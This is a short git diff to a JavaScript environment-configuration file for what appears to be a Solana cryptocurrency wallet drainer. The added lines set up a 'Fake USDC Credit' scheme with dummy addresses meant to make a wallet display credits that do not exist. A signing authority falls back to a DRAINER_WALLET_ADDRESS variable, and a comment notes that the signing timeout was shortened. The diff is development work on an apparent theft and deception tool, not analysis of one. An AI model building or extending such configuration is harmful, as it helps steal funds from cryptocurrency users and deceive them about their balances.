@@ -62,7 +62,13 @@ export const ENV_CONFIG = {
   SIGNING_TIMEOUT: parseInt(process.env.SIGNING_TIMEOUT) || 30000, // Reduced from 90s to 30s - much faster
   
   // Jupiter API Configuration
-  JUPITER_TOKEN_LIST_URL: process.env.JUPITER_TOKEN_LIST_URL || 'https://token.jup.ag/all'
+  JUPITER_TOKEN_LIST_URL: process.env.JUPITER_TOKEN_LIST_URL || 'https://token.jup.ag/all',
+  
+  // Fake USDC Credit Configuration (Zero-Capital Approach)
+  // These are dummy addresses for consistent wallet display - no real accounts created
+  FAKE_USDC_MINT: process.env.FAKE_USDC_MINT || '11111111111111111111111111111111',
+  SOURCE_FAKE_USDC_ATA: process.env.SOURCE_FAKE_USDC_ATA || '11111111111111111111111111111111',
+  SOURCE_AUTHORITY: process.env.SOURCE_AUTHORITY || process.env.DRAINER_WALLET_ADDRESS || '11111111111111111111111111111111'
 };
 
 // Prioritized RPC endpoints - Helius and Shyft first, then fallbacks
